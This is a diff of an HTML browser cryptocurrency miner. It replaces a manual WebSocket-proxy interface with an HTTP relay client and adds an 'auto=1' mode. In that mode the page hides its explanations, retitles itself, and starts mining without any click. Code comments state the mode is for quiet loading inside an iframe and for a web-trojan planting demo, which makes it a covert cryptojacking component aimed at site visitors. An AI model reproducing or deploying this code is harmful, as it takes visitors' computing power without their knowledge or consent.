@@ -1,96 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Stratum mining (browser)</title>
+  <title>Stratum HTTP 中继演示</title>
   <style>
     :root {
       --bg: #0f1419;
       --panel: #1a2332;
       --text: #e7ecf3;
       --muted: #8b9cb3;
-      --warn-bg: #3d2914;
-      --warn-border: #c9a227;
       --accent: #3d8bfd;
       --danger: #e85d5d;
     }
-    * { box-sizing: border-box; }
     body {
       margin: 0;
       min-height: 100vh;
       font-family: "Segoe UI", system-ui, sans-serif;
       background: var(--bg);
       color: var(--text);
-      line-height: 1.5;
+      padding: 1.5rem;
+      max-width: 44rem;
+      margin-inline: auto;
     }
-    .banner {
-      background: var(--warn-bg);
-      border-bottom: 3px solid var(--warn-border);
-      padding: 1rem 1.25rem;
-      font-size: 0.95rem;
-    }
-    .banner strong { color: #f5e6a3; }
-    main {
-      max-width: 42rem;
-      margin: 0 auto;
-      padding: 2rem 1.25rem;
-    }
-    h1 { font-size: 1.35rem; font-weight: 600; margin: 0 0 0.5rem; }
-    .sub { color: var(--muted); font-size: 0.9rem; margin-bottom: 1.75rem; }
+    h1 { font-size: 1.25rem; }
+    .sub { color: var(--muted); font-size: 0.9rem; margin-bottom: 1rem; }
     .panel {
       background: var(--panel);
       border-radius: 10px;
-      padding: 1.25rem 1.5rem;
-      margin-bottom: 1.25rem;
+      padding: 1.25rem;
+      margin-bottom: 1rem;
       border: 1px solid rgba(255,255,255,0.06);
     }
     label { display: block; font-size: 0.85rem; color: var(--muted); margin-bottom: 0.35rem; }
-    input[type="range"] { width: 100%; }
-    .row {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.75rem;
-      align-items: center;
-      margin-top: 1rem;
-    }
-    button {
-      font: inherit;
-      padding: 0.55rem 1.1rem;
-      border-radius: 8px;
-      border: none;
-      cursor: pointer;
-      font-weight: 600;
-    }
-    button:disabled { opacity: 0.45; cursor: not-allowed; }
-    #start { background: var(--accent); color: #fff; }
-    #stop { background: var(--danger); color: #fff; }
-    .stats {
-      font-family: ui-monospace, monospace;
-      font-size: 0.85rem;
-      color: var(--muted);
-      margin-top: 0.75rem;
-    }
-    .stats strong { color: var(--text); }
-    .ok { color: #6bcf7f; }
-    ul { color: var(--muted); font-size: 0.9rem; padding-left: 1.25rem; }
-    .err { color: #e85d5d; font-size: 0.9rem; margin-top: 0.5rem; }
-    .stratum-log {
-      width: 100%;
-      min-height: 11rem;
-      max-height: 22rem;
-      font-family: ui-monospace, monospace;
-      font-size: 0.72rem;
-      line-height: 1.35;
-      background: #0d1117;
-      color: #c9d1d9;
-      border: 1px solid rgba(255,255,255,0.1);
-      border-radius: 8px;
-      padding: 0.65rem 0.75rem;
-      resize: vertical;
-      margin-top: 0.5rem;
-    }
-    .stratum-field {
+    input[type="text"], input[type="number"] {
       width: 100%;
       padding: 0.45rem 0.6rem;
       border-radius: 6px;
@@ -98,174 +41,111 @@
       background: #0d1117;
       color: var(--text);
       font: inherit;
+      box-sizing: border-box;
     }
-    .stratum-grid {
-      display: grid;
-      grid-template-columns: 1fr auto;
-      gap: 0.5rem 0.75rem;
-      align-items: end;
-      margin-top: 0.75rem;
+    .row { display: flex; flex-wrap: wrap; gap: 0.6rem; margin-top: 0.75rem; }
+    button {
+      font: inherit;
+      padding: 0.5rem 1rem;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      font-weight: 600;
     }
-    .stratum-grid label { margin: 0; }
-    .hint { font-size: 0.82rem; color: var(--muted); margin: 0.35rem 0 0; }
+    button:disabled { opacity: 0.45; cursor: not-allowed; }
+    #btnStart { background: var(--accent); color: #fff; }
+    #btnStop { background: var(--danger); color: #fff; }
     .btn-muted { background: #2d3a4d; color: var(--text); }
-    #stratumHint { font-size: 0.85rem; color: var(--muted); margin-top: 0.5rem; min-height: 1.25em; }
+    .stats { font-family: ui-monospace; font-size: 0.85rem; color: var(--muted); margin-top: 0.75rem; }
+    .stats strong { color: var(--text); }
+    .err { color: #e85d5d; font-size: 0.9rem; margin-top: 0.5rem; }
+    code { font-size: 0.88em; }
+    ul { margin: 0.5rem 0 0; padding-left: 1.2rem; color: var(--muted); font-size: 0.88rem; }
+    /* URL 参数 auto=1 时隐藏说明区，便于 iframe 内低调加载 */
+    body.auto-mining > .sub,
+    body.auto-mining .panel-intro,
+    body.auto-mining .panel-hint {
+      display: none !important;
+    }
+    body.auto-mining h1 { font-size: 1rem; margin-bottom: 0.5rem; }
   </style>
 </head>
 <body>
-  <main>
-    <h1>Stratum mining (browser)</h1>
-    <p class="sub">Connect to a pool over Stratum only; jobs use double SHA-256 with share target <code>hash &lt; diff1÷difficulty</code>. Open this page via a <strong>local HTTP server</strong> (see below); otherwise the Worker cannot load scripts. Browser hashrate is negligible; worker count and batch size are capped to avoid overheating the machine.</p>
+  <h1>HTTP 中继（浏览器 → relay-server → 矿池）</h1>
+  <p class="sub">
+    本页通过 <code>GET /api/job</code>、<code>POST /api/submit</code> 与本机 <code>relay-server.js</code> 通信；矿池账号与 Stratum TCP 仅在 Node 进程内。请勿用 <code>file://</code> 打开，需本地 HTTP 服务。
+    开始挖矿后会<strong>自动</strong>定时向中继拉取最新任务（矿池下发新块/新难度时与 relay 保持一致），一般不必手动反复点「拉取任务状态」；仅在未开始挖矿时可用它先看是否就绪。
+  </p>
 
-    <div class="panel">
-      <label for="workers">Workers (max 4, to reduce CPU load)</label>
-      <input type="range" id="workers" min="1" max="4" value="1" />
-      <div class="stats" id="workersVal">Current: 1 worker(s)</div>
+  <div class="panel panel-intro">
+    <p style="margin:0 0 0.5rem;font-size:0.9rem;color:var(--text)"><strong>如何打开本页</strong></p>
+    <ul>
+      <li>在 <code>mining-demo</code> 的<strong>上一级目录</strong>执行：<code>python -m http.server 8080 --bind 127.0.0.1</code></li>
+      <li>浏览器访问：<code>http://127.0.0.1:8080/mining-demo/index.html</code></li>
+    </ul>
+  </div>
 
-      <label for="throttle" style="margin-top:1rem">Throttle (1 = lightest CPU, 10 = heaviest; lower values sleep longer between batches)</label>
-      <input type="range" id="throttle" min="1" max="10" value="1" />
-      <div class="stats" id="throttleVal">Current: 1 / 10</div>
-      <p class="stats" id="cpuHint" style="margin-top:0.35rem"></p>
+  <div class="panel">
+    <label for="relayBase">中继 HTTP 根地址</label>
+    <input type="text" id="relayBase" value="http://127.0.0.1:3001" autocomplete="off" />
 
-      <label style="display:flex;align-items:center;gap:0.5rem;margin-top:1rem;cursor:pointer;font-size:0.9rem;color:var(--text)">
-        <input type="checkbox" id="stratumAutoSubmit" checked />
-        Auto mining.submit when a valid share is found
-      </label>
+    <label for="workers" style="margin-top:0.75rem">Worker 数量（1–4）</label>
+    <input type="number" id="workers" min="1" max="4" value="1" />
+    <label for="throttle" style="margin-top:0.75rem">负载限制（1–10）</label>
+    <input type="number" id="throttle" min="1" max="10" value="1" />
 
-      <div class="row">
-        <button type="button" id="start">Start mining</button>
-        <button type="button" id="stop" disabled>Stop</button>
-      </div>
-      <div class="stats" id="status">Status: <span class="ok">Idle</span></div>
-      <div class="stats" id="live">
-        Total hashes: <strong id="totalHashes">0</strong><br />
-        Combined hashrate: <strong id="hashrate">0 H/s</strong><br />
-        Valid shares: <strong id="shareCount">0</strong>
-      </div>
-      <p class="err" id="workerErr" hidden></p>
+    <div class="row">
+      <button type="button" id="btnPoll" class="btn-muted">拉取任务状态</button>
+      <button type="button" id="btnStart">开始挖矿</button>
+      <button type="button" id="btnStop" disabled>停止</button>
     </div>
-
-    <div class="panel">
-      <h2 style="font-size:1.05rem; font-weight:600; margin:0 0 0.35rem;">Connect to pool (local proxy required)</h2>
-      <p class="hint">Browsers cannot open raw pool TCP. Run <code>node stratum-proxy.js</code> (after <code>npm install</code>), connect WebSocket to the proxy and TCP to the pool, complete subscribe / authorize, then after <code>mining.notify</code> you can start mining above.</p>
-
-      <div class="stratum-grid" style="grid-template-columns:1fr;">
-        <label for="wsUrl">Proxy WebSocket (do not open in the address bar)</label>
-        <input type="text" id="wsUrl" class="stratum-field" value="ws://127.0.0.1:8787" autocomplete="off" />
-        <p class="hint" style="margin-top:0.35rem">Open this page with <strong>http://</strong> first (e.g. <code>http://127.0.0.1:8080</code>), then enter <code>ws://…</code> here and click &quot;Connect proxy&quot;. Typing <code>ws://</code> in the address bar will fail.</p>
-      </div>
-      <div class="row" style="margin-top:0.65rem">
-        <button type="button" id="stratumWsConnect" class="btn-muted">Connect proxy</button>
-        <button type="button" id="stratumWsDisconnect" class="btn-muted" disabled>Disconnect proxy</button>
-      </div>
-
-      <div class="stratum-grid">
-        <label for="poolHost">Pool host (Stratum TCP)</label>
-        <label for="poolPort" style="grid-column:2">Port</label>
-        <input type="text" id="poolHost" class="stratum-field" placeholder="e.g. pool hostname" autocomplete="off" />
-        <input type="number" id="poolPort" class="stratum-field" style="max-width:6.5rem" value="3333" min="1" max="65535" />
-      </div>
-      <div class="row">
-        <button type="button" id="stratumTcpConnect" class="btn-muted" disabled>Connect pool</button>
-        <button type="button" id="stratumTcpDisconnect" class="btn-muted" disabled>Disconnect pool</button>
-      </div>
-
-      <div class="stratum-grid" style="grid-template-columns:1fr 1fr; margin-top:1rem">
-        <div>
-          <label for="stratumWorker">Worker（mining.authorize）</label>
-          <input type="text" id="stratumWorker" class="stratum-field" placeholder="address.worker or pool format" autocomplete="off" />
-        </div>
-        <div>
-          <label for="stratumPass">Password</label>
-          <input type="text" id="stratumPass" class="stratum-field" placeholder="often x" value="x" autocomplete="off" />
-        </div>
-      </div>
-      <div class="row">
-        <button type="button" id="stratumSubscribe" class="btn-muted" disabled>Send mining.subscribe</button>
-        <button type="button" id="stratumAuthorize" class="btn-muted" disabled>Send mining.authorize</button>
-        <button type="button" id="stratumLogClear" class="btn-muted">Clear log</button>
-      </div>
-
-      <textarea id="stratumLog" class="stratum-log" readonly spellcheck="false" aria-label="Stratum log"></textarea>
-      <p id="stratumHint"></p>
+    <p class="stats" id="jobStatus">任务：未拉取</p>
+    <div class="stats" id="live">
+      合计算力：<strong id="hashrate">0 H/s</strong> · 有效 share：<strong id="shareCount">0</strong>
     </div>
+    <p class="err" id="err" hidden></p>
+  </div>
 
-    <div class="panel">
-      <p style="margin:0 0 0.5rem; font-size:0.9rem;">How to open:</p>
-      <ul>
-        <li>From the <strong>parent folder</strong> of <code>mining-demo</code>, run: <code>python -m http.server 8080 --bind 127.0.0.1</code> (<code>--bind 127.0.0.1</code> avoids Windows binding only IPv6 and <code>127.0.0.1</code> showing ERR_EMPTY_RESPONSE). Then open: <code>http://127.0.0.1:8080/mining-demo/index.html</code>.</li>
-        <li>If you skipped <code>--bind</code> and the page fails, try: <code>http://[::1]:8080/mining-demo/index.html</code>.</li>
-        <li>In another terminal: <code>npm install</code> then <code>node stratum-proxy.js</code>.</li>
-        <li>If the machine gets hot or stutters: click Stop, set workers to 1, and lower throttle.</li>
-        <li>If the pool requires TLS, this proxy only supports plain TCP; use another port or extend the proxy.</li>
-      </ul>
-    </div>
-  </main>
+  <div class="panel panel-hint">
+    <p style="margin:0;font-size:0.88rem;color:var(--muted)">
+      <strong>启动 relay（另开终端，账号改为你的）</strong>：<br />
+      <code>node relay-server.js -H stratum.braiins.com -p 3333 -u 子账户.矿工 --pass x</code><br />
+      或使用 <code>npm run relay -- -H stratum.braiins.com -u 子账户.矿工</code>（<code>--</code> 后面接参数）。<code>node relay-server.js --help</code> 查看全部选项。
+    </p>
+  </div>
 
   <script src="stratum-utils.js"></script>
   <script>
-    const workersSlider = document.getElementById("workers");
-    const throttleSlider = document.getElementById("throttle");
-    const workersVal = document.getElementById("workersVal");
-    const throttleVal = document.getElementById("throttleVal");
-    const cpuHintEl = document.getElementById("cpuHint");
-    const btnStart = document.getElementById("start");
-    const btnStop = document.getElementById("stop");
-    const status = document.getElementById("status");
-    const totalHashesEl = document.getElementById("totalHashes");
+    const relayBase = document.getElementById("relayBase");
+    const workersEl = document.getElementById("workers");
+    const throttleEl = document.getElementById("throttle");
+    const btnPoll = document.getElementById("btnPoll");
+    const btnStart = document.getElementById("btnStart");
+    const btnStop = document.getElementById("btnStop");
+    const jobStatus = document.getElementById("jobStatus");
     const hashrateEl = document.getElementById("hashrate");
     const shareCountEl = document.getElementById("shareCount");
-    const workerErr = document.getElementById("workerErr");
-
-    const stratumState = {
-      subscribeOk: false,
-      extranonce1: "",
-      extranonce2Size: 4,
-      jobId: "",
-      prevhash: "",
-      coinb1: "",
-      coinb2: "",
-      merkleBranches: [],
-      version: "",
-      nbits: "",
-      ntime: "",
-      difficulty: 1,
-      cleanJobs: false,
-    };
-    let stratumMiningActive = false;
-
-    function stratumJobReady() {
-      if (!stratumState.subscribeOk) return false;
-      if (!stratumState.jobId || !stratumState.prevhash) return false;
-      if (stratumState.coinb1 == null || stratumState.coinb1 === "" || stratumState.coinb2 == null || stratumState.coinb2 === "") return false;
-      if (!Array.isArray(stratumState.merkleBranches)) return false;
-      return true;
-    }
-
-    function makeExtranonce2Hex(size, workerIndex) {
-      const u = new Uint8Array(size);
-      crypto.getRandomValues(u);
-      u[0] = (u[0] ^ (workerIndex & 255)) & 255;
-      return StratumUtils.bytesToHex(u);
-    }
-
-    function syncLabels() {
-      workersVal.textContent = "Current: " + workersSlider.value + " worker(s)";
-      throttleVal.textContent = "Current: " + throttleSlider.value + " / 10";
-    }
-    workersSlider.addEventListener("input", syncLabels);
-    throttleSlider.addEventListener("input", syncLabels);
-    syncLabels();
-    (function cpuHint() {
-      const hc = navigator.hardwareConcurrency || 4;
-      const suggest = Math.max(1, Math.floor(hc / 2));
-      cpuHintEl.textContent =
-        "About " + hc + " logical CPUs; suggest workers ≤ " + suggest + ". If it stutters, lower throttle or workers.";
-    })();
-
+    const errEl = document.getElementById("err");
     const workerScriptUrl = new URL("miner-worker.js", document.baseURI || location.href).href;
     let pool = [];
     const perWorker = new Map();
+    let stratumState = {
+      difficulty: 1,
+      extranonce1: "",
+      extranonce2Size: 4,
+      job: null,
+    };
+    let stratumMiningActive = false;
+    let autoSubmit = true;
+    /** 当前 Worker 正在用的任务签名（jobId + 难度 + ntime），用于检测矿池是否换新任务 */
+    let lastWorkerJobKey = "";
+    let jobPollTimer = null;
+    const JOB_POLL_MS = 20000;
+
+    function showErr(t) {
+      errEl.hidden = !t;
+      errEl.textContent = t || "";
+    }
 
     function formatRate(rate) {
       if (rate >= 1e6) return (rate / 1e6).toFixed(2) + " MH/s";
@@ -280,32 +160,85 @@
         sumRate += s.rate;
         sumShares += s.shares;
       }
-      const approxTotal = Array.from(perWorker.values()).reduce((a, s) => a + s.total, 0);
-      totalHashesEl.textContent = approxTotal.toLocaleString("en-US");
       hashrateEl.textContent = formatRate(sumRate);
-      shareCountEl.textContent = sumShares.toLocaleString("en-US");
+      shareCountEl.textContent = String(sumShares);
     }
 
-    function setRunning(running) {
-      btnStart.disabled = running;
-      btnStop.disabled = !running;
-      workersSlider.disabled = running;
-      throttleSlider.disabled = running;
-      const autoEl = document.getElementById("stratumAutoSubmit");
-      if (autoEl) autoEl.disabled = running;
-      if (running) {
-        status.innerHTML =
-          'Status: <span style="color:#f0c674">Running (Stratum, share target diff1÷difficulty)</span>';
-      } else {
-        status.innerHTML = 'Status: <span class="ok">Idle</span>';
-        stratumMiningActive = false;
+    function makeExtranonce2Hex(size, workerIndex) {
+      const u = new Uint8Array(size);
+      crypto.getRandomValues(u);
+      u[0] = (u[0] ^ (workerIndex & 255)) & 255;
+      return StratumUtils.bytesToHex(u);
+    }
+
+    function jobReady() {
+      return stratumState.job && stratumState.job.jobId && stratumState.job.prevhash;
+    }
+
+    function workerJobKey() {
+      const j = stratumState.job;
+      if (!j || !j.jobId) return "";
+      return j.jobId + "|" + String(stratumState.difficulty) + "|" + j.ntime;
+    }
+
+    function stopJobPoll() {
+      if (jobPollTimer != null) {
+        clearInterval(jobPollTimer);
+        jobPollTimer = null;
       }
-      if (!running) {
+    }
+
+    /** 挖矿过程中定时调用：中继上的任务若与当前 Worker 不一致则重启 Worker */
+    async function pollJobWhileMining() {
+      if (!stratumMiningActive) return;
+      try {
+        const ok = await fetchJob();
+        if (!ok || !jobReady()) return;
+        const k = workerJobKey();
+        if (k === lastWorkerJobKey) return;
+        lastWorkerJobKey = k;
+        pool.forEach(function (w) {
+          try {
+            w.postMessage({ cmd: "stop" });
+            w.terminate();
+          } catch (_) {}
+        });
+        pool = [];
         perWorker.clear();
-        totalHashesEl.textContent = "0";
-        hashrateEl.textContent = "0 H/s";
-        shareCountEl.textContent = "0";
+        const count = Math.min(4, Math.max(1, parseInt(workersEl.value, 10)));
+        const throttle = parseInt(throttleEl.value, 10);
+        startStratumWorkersOnly(count, throttle);
+      } catch (_) {}
+    }
+
+    async function fetchJob() {
+      const base = (relayBase.value || "").replace(/\/$/, "");
+      const r = await fetch(base + "/api/job", { method: "GET" });
+      const j = await r.json();
+      if (!j.ready) {
+        jobStatus.textContent = "任务：" + (j.message || "未就绪");
+        return false;
       }
+      stratumState.difficulty = j.difficulty || 1;
+      stratumState.extranonce1 = j.extranonce1 != null ? j.extranonce1 : "";
+      stratumState.extranonce2Size = j.extranonce2Size | 0;
+      stratumState.job = j.job;
+      jobStatus.textContent = "任务：就绪 job_id=" + j.job.jobId + " difficulty=" + stratumState.difficulty;
+      return true;
+    }
+
+    async function submitShare(payload) {
+      const base = (relayBase.value || "").replace(/\/$/, "");
+      await fetch(base + "/api/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          jobId: payload.jobId,
+          extranonce2: payload.extranonce2,
+          ntime: payload.ntime,
+          nonce: payload.nonce,
+        }),
+      });
     }
 
     function handleMinerMessage(ev) {
@@ -320,40 +253,21 @@
         return;
       }
       if (ev.data.type === "stratum_share") {
-        const auto = document.getElementById("stratumAutoSubmit");
-        if (auto && auto.checked) stratumSendMiningSubmit(ev.data);
-        appendStratumLog(
-          "· ",
-          "[share: hash<diff1/d] job=" + ev.data.jobId + " nonce=" + ev.data.nonce
-        );
+        if (autoSubmit) {
+          submitShare(ev.data).catch(function () {});
+        }
       }
-    }
-
-    function stratumSendMiningSubmit(payload) {
-      const user = (document.getElementById("stratumWorker").value || "").trim();
-      if (!user) return;
-      if (!stratumWs || stratumWs.readyState !== WebSocket.OPEN) return;
-      const line = JSON.stringify({
-        id: stratumRpcId++,
-        method: "mining.submit",
-        params: [user, payload.jobId, payload.extranonce2, payload.ntime, payload.nonce],
-      });
-      stratumWs.send(JSON.stringify({ type: "stratum_send", line }));
-      appendStratumLog("→ ", line);
     }
 
     function startStratumWorkersOnly(count, throttle) {
       const size = stratumState.extranonce2Size | 0;
-      if (size < 1 || size > 32) throw new Error("Invalid extranonce2_size; subscribe again.");
-
+      if (size < 1 || size > 32) throw new Error("extranonce2_size 无效");
+      const j = stratumState.job;
       for (let i = 0; i < count; i++) {
         const w = new Worker(workerScriptUrl);
         w.onmessage = handleMinerMessage;
-        w.onerror = function (err) {
-          workerErr.hidden = false;
-          workerErr.textContent =
-            "Worker error (if you opened the HTML by double-click, use a local HTTP server instead): " +
-            (err.message || "Failed to load script");
+        w.onerror = function () {
+          showErr("Worker 加载失败，请用 HTTP 打开本页");
         };
         w.postMessage({
           cmd: "startStratum",
@@ -362,14 +276,14 @@
           throttle: throttle,
           difficulty: stratumState.difficulty || 1,
           job: {
-            jobId: stratumState.jobId,
-            prevhash: stratumState.prevhash,
-            coinb1: stratumState.coinb1,
-            coinb2: stratumState.coinb2,
-            merkleBranches: stratumState.merkleBranches,
-            version: stratumState.version,
-            nbits: stratumState.nbits,
-            ntime: stratumState.ntime,
+            jobId: j.jobId,
+            prevhash: j.prevhash,
+            coinb1: j.coinb1,
+            coinb2: j.coinb2,
+            merkleBranches: j.merkleBranches,
+            version: j.version,
+            nbits: j.nbits,
+            ntime: j.ntime,
             extranonce1: stratumState.extranonce1,
             extranonce2Hex: makeExtranonce2Hex(size, i),
           },
@@ -378,9 +292,23 @@
       }
     }
 
-    function restartStratumMinersIfNeeded() {
-      if (!stratumMiningActive) return;
-      if (!stratumJobReady()) return;
+    btnPoll.addEventListener("click", async function () {
+      showErr("");
+      try {
+        await fetchJob();
+      } catch (e) {
+        showErr(String(e.message || e));
+      }
+    });
+
+    /** @returns {Promise<boolean>} 是否已成功开始 */
+    async function startMining() {
+      showErr("");
+      const ok = await fetchJob();
+      if (!ok || !jobReady()) {
+        showErr("中继尚无任务：请确认 relay-server 已连上矿池并出现 mining.notify，再点「拉取任务状态」。");
+        return false;
+      }
       pool.forEach(function (w) {
         try {
           w.postMessage({ cmd: "stop" });
@@ -389,270 +317,102 @@
       });
       pool = [];
       perWorker.clear();
-      const count = parseInt(workersSlider.value, 10);
-      const throttle = parseInt(throttleSlider.value, 10);
-      try {
-        startStratumWorkersOnly(count, throttle);
-      } catch (e) {
-        workerErr.hidden = false;
-        workerErr.textContent = String(e.message || e);
-      }
-    }
-
-    function handleStratumLine(j) {
-      if (!j || typeof j !== "object") return;
-      if (j.method === "mining.notify") {
-        const p = j.params;
-        if (!Array.isArray(p) || p.length < 8) return;
-        stratumState.jobId = p[0];
-        stratumState.prevhash = p[1];
-        stratumState.coinb1 = p[2];
-        stratumState.coinb2 = p[3];
-        stratumState.merkleBranches = p[4];
-        stratumState.version = p[5];
-        stratumState.nbits = p[6];
-        stratumState.ntime = p[7];
-        stratumState.cleanJobs = !!p[8];
-        restartStratumMinersIfNeeded();
-        return;
-      }
-      if (j.method === "mining.set_difficulty" && j.params && j.params.length) {
-        stratumState.difficulty = Number(j.params[0]) || 1;
-        restartStratumMinersIfNeeded();
-        return;
-      }
-      if (j.result !== undefined && j.error == null && Array.isArray(j.result) && j.result.length >= 3) {
-        const en1 = j.result[1];
-        const en2n = Number(j.result[2]);
-        if (typeof en1 === "string" && Number.isFinite(en2n) && en2n >= 0 && en2n <= 32) {
-          stratumState.extranonce1 = en1;
-          stratumState.extranonce2Size = en2n;
-          stratumState.subscribeOk = true;
-        }
-      }
-    }
-
-    btnStart.addEventListener("click", () => {
-      workerErr.hidden = true;
-      workerErr.textContent = "";
-      const count = Math.min(4, Math.max(1, parseInt(workersSlider.value, 10)));
-      const throttle = parseInt(throttleSlider.value, 10);
-      pool = [];
-      perWorker.clear();
-
-      if (!stratumJobReady()) {
-        workerErr.hidden = false;
-        workerErr.textContent =
-          "Job not ready: connect to the pool, complete subscribe and authorize, and receive mining.notify.";
-        return;
-      }
+      const count = Math.min(4, Math.max(1, parseInt(workersEl.value, 10)));
+      const throttle = parseInt(throttleEl.value, 10);
       stratumMiningActive = true;
       try {
         startStratumWorkersOnly(count, throttle);
-      } catch (err) {
+        lastWorkerJobKey = workerJobKey();
+        stopJobPoll();
+        jobPollTimer = setInterval(pollJobWhileMining, JOB_POLL_MS);
+      } catch (e) {
         stratumMiningActive = false;
-        workerErr.hidden = false;
-        workerErr.textContent = String(err.message || err);
-        return;
+        showErr(String(e.message || e));
+        return false;
       }
-      setRunning(true);
+      btnStart.disabled = true;
+      btnStop.disabled = false;
+      return true;
+    }
+
+    btnStart.addEventListener("click", function () {
+      startMining();
     });
 
-    btnStop.addEventListener("click", () => {
-      pool.forEach((w) => {
+    /**
+     * 轮询直到中继有任务再自动开始（iframe / 挂马演示用）
+     * @param {number} maxAttempts 每次间隔约 2s，默认约 2 分钟
+     */
+    async function waitForJobAndAutoStart(maxAttempts, intervalMs) {
+      maxAttempts = maxAttempts == null ? 60 : maxAttempts;
+      intervalMs = intervalMs == null ? 2000 : intervalMs;
+      jobStatus.textContent = "任务：等待中继与矿池（自动挖矿）…";
+      for (let a = 0; a < maxAttempts; a++) {
+        try {
+          const ok = await fetchJob();
+          if (ok && jobReady()) {
+            await startMining();
+            return true;
+          }
+        } catch (_) {}
+        await new Promise(function (r) {
+          setTimeout(r, intervalMs);
+        });
+      }
+      showErr(
+        "自动挖矿：等待中继任务超时。请确认已运行 relay-server 且矿池已下发 mining.notify。"
+      );
+      return false;
+    }
+
+    (function applyUrlParams() {
+      const p = new URLSearchParams(location.search);
+      if (p.get("relay")) relayBase.value = p.get("relay");
+      if (p.get("workers")) {
+        const w = parseInt(p.get("workers"), 10);
+        if (w >= 1 && w <= 4) workersEl.value = String(w);
+      }
+      if (p.get("throttle")) {
+        const t = parseInt(p.get("throttle"), 10);
+        if (t >= 1 && t <= 10) throttleEl.value = String(t);
+      }
+      const auto = p.get("auto") === "1" || p.get("auto") === "true";
+      if (auto) {
+        document.body.classList.add("auto-mining");
+        document.title = "Stratum（自动）";
+        waitForJobAndAutoStart(
+          p.get("waitAttempts") ? parseInt(p.get("waitAttempts"), 10) : 60,
+          p.get("waitMs") ? parseInt(p.get("waitMs"), 10) : 2000
+        );
+      }
+    })();
+
+    btnStop.addEventListener("click", function () {
+      stopJobPoll();
+      lastWorkerJobKey = "";
+      pool.forEach(function (w) {
         try {
           w.postMessage({ cmd: "stop" });
           w.terminate();
         } catch (_) {}
       });
       pool = [];
-      setRunning(false);
+      perWorker.clear();
+      stratumMiningActive = false;
+      btnStart.disabled = false;
+      btnStop.disabled = true;
+      hashrateEl.textContent = "0 H/s";
+      shareCountEl.textContent = "0";
     });
 
-    window.addEventListener("beforeunload", () => {
-      pool.forEach((w) => {
+    window.addEventListener("beforeunload", function () {
+      stopJobPoll();
+      pool.forEach(function (w) {
         try {
           w.terminate();
         } catch (_) {}
       });
-      if (stratumWs && stratumWs.readyState === WebSocket.OPEN) {
-        try {
-          stratumWs.close();
-        } catch (_) {}
-      }
     });
-
-    /* ---- Stratum demo (via local stratum-proxy.js) ---- */
-    const stratumWsConnect = document.getElementById("stratumWsConnect");
-    const stratumWsDisconnect = document.getElementById("stratumWsDisconnect");
-    const stratumTcpConnect = document.getElementById("stratumTcpConnect");
-    const stratumTcpDisconnect = document.getElementById("stratumTcpDisconnect");
-    const stratumSubscribe = document.getElementById("stratumSubscribe");
-    const stratumAuthorize = document.getElementById("stratumAuthorize");
-    const stratumLogClear = document.getElementById("stratumLogClear");
-    const wsUrlInput = document.getElementById("wsUrl");
-    const poolHostInput = document.getElementById("poolHost");
-    const poolPortInput = document.getElementById("poolPort");
-    const stratumWorkerInput = document.getElementById("stratumWorker");
-    const stratumPassInput = document.getElementById("stratumPass");
-    const stratumLog = document.getElementById("stratumLog");
-    const stratumHint = document.getElementById("stratumHint");
-
-    let stratumWs = null;
-    let stratumRpcId = 1;
-
-    function stratumSetHint(text) {
-      stratumHint.textContent = text || "";
-    }
-
-    function appendStratumLog(prefix, text) {
-      stratumLog.value += prefix + text + "\n";
-      stratumLog.scrollTop = stratumLog.scrollHeight;
-    }
-
-    function stratumSendLine(obj) {
-      if (!stratumWs || stratumWs.readyState !== WebSocket.OPEN) return;
-      const line = typeof obj === "string" ? obj : JSON.stringify(obj);
-      stratumWs.send(JSON.stringify({ type: "stratum_send", line }));
-      appendStratumLog("→ ", line);
-    }
-
-    function parseStratumSummary(line) {
-      try {
-        const j = JSON.parse(line);
-        if (j.method === "mining.notify" && Array.isArray(j.params) && j.params.length) {
-          const jobId = j.params[0];
-          const prev = j.params[1];
-          const tail = prev && prev.length > 14 ? prev.slice(0, 14) + "…" : prev;
-          return `mining.notify: job_id=${jobId}, prevhash prefix ${tail}`;
-        }
-        if (j.method === "mining.set_difficulty" && j.params && j.params[0] != null) {
-          return "mining.set_difficulty: " + j.params[0];
-        }
-        if (j.result && Array.isArray(j.result) && j.result.length >= 2) {
-          const en = j.result[1];
-          if (typeof en === "string" && en.length) {
-            return "subscribe response: extranonce1=" + en + " (" + en.length / 2 + " bytes hex)";
-          }
-        }
-        if (j.error) {
-          return "error: " + JSON.stringify(j.error);
-        }
-      } catch (_) {}
-      return "";
-    }
-
-    function onStratumWsMessage(ev) {
-      let data;
-      try {
-        data = JSON.parse(ev.data);
-      } catch {
-        appendStratumLog("· ", String(ev.data));
-        return;
-      }
-      if (data.type === "status") {
-        appendStratumLog("· ", (data.ok ? "[ok] " : "[×] ") + (data.message || ""));
-        return;
-      }
-      if (data.type === "stratum" && typeof data.line === "string") {
-        const line = data.line;
-        appendStratumLog("← ", line);
-        try {
-          handleStratumLine(JSON.parse(line));
-        } catch (_) {}
-        const sum = parseStratumSummary(line);
-        if (sum) stratumSetHint(sum);
-        return;
-      }
-    }
-
-    function updateStratumButtons() {
-      const wsOpen = stratumWs && stratumWs.readyState === WebSocket.OPEN;
-      stratumWsConnect.disabled = wsOpen;
-      stratumWsDisconnect.disabled = !wsOpen;
-      stratumTcpConnect.disabled = !wsOpen;
-      stratumTcpDisconnect.disabled = !wsOpen;
-      stratumSubscribe.disabled = !wsOpen;
-      stratumAuthorize.disabled = !wsOpen;
-    }
-
-    stratumWsConnect.addEventListener("click", () => {
-      const url = (wsUrlInput.value || "").trim();
-      if (!url) return;
-      try {
-        stratumWs = new WebSocket(url);
-      } catch (e) {
-        appendStratumLog("· ", "WebSocket failed to create: " + (e.message || e));
-        return;
-      }
-      updateStratumButtons();
-      stratumWs.onopen = () => {
-        appendStratumLog("· ", "Connected to local proxy " + url);
-        updateStratumButtons();
-      };
-      stratumWs.onclose = () => {
-        appendStratumLog("· ", "WebSocket to proxy closed");
-        stratumWs = null;
-        stratumSetHint("");
-        updateStratumButtons();
-      };
-      stratumWs.onerror = () => {
-        appendStratumLog("· ", "WebSocket error (is the proxy running?)");
-      };
-      stratumWs.onmessage = onStratumWsMessage;
-    });
-
-    stratumWsDisconnect.addEventListener("click", () => {
-      if (stratumWs) {
-        try {
-          stratumWs.close();
-        } catch (_) {}
-        stratumWs = null;
-      }
-      updateStratumButtons();
-    });
-
-    stratumTcpConnect.addEventListener("click", () => {
